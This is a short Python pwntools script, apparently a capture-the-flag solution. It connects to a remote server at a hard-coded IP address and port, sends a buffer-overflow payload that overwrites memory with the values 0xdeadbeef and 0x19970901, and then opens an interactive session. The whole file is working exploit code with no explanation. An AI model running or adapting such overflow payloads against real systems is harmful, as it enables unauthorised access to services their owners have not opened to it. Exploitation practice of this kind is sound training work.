from pwn import *

context.log_level='debug'

p = remote('141.164.48.98', '30001')

'''
with open('payload.txt', mode='rb') as file: # b is important -> binary
    payload = file.read()
print(payload)
'''

payload = 0x0.to_bytes(16, 'little')
payload += 0xdeadbeef.to_bytes(4, 'little')
payload += 0x0.to_bytes(12, 'little')
payload += 0x19970901.to_bytes(4, 'little')


p.sendline(payload)
p.interactive()
